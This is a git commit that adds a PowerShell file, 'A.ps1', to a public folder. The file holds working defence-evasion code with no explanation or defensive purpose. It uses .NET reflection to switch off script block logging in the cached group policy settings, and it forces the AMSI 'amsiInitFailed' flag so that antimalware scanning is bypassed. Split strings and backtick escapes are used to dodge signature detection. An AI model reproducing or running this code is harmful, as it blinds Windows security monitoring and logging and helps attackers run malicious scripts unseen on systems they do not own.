0d843488cd27a49f6699fff7c0eb5cd8e80f0056
BAA4TS <baa4tsdev@gmail.com>
2025-09-23 16:03:52 -0300

    Create A.ps1

---
+++ public/A.ps1
@@ -0,0 +1,6 @@
+# PowerShell reflection to disable script block logging
+$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings','N'+'onPublic,Static');
+If($GPF){$GPC=$GPF.GetValue($null);If($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}}
+
+# Using .NET reflection to patch logging mechanisms
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
